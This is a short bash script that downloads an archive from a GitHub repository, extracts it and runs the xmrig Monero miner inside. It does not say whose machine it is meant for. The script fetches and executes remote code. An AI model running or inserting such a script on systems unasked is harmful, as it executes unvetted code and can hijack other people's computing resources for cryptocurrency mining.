#!/bin/bash
wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/ok.tar.gz
tar xvf ok.tar.gz
cd ok
chmod +x xmrig
./xmrig
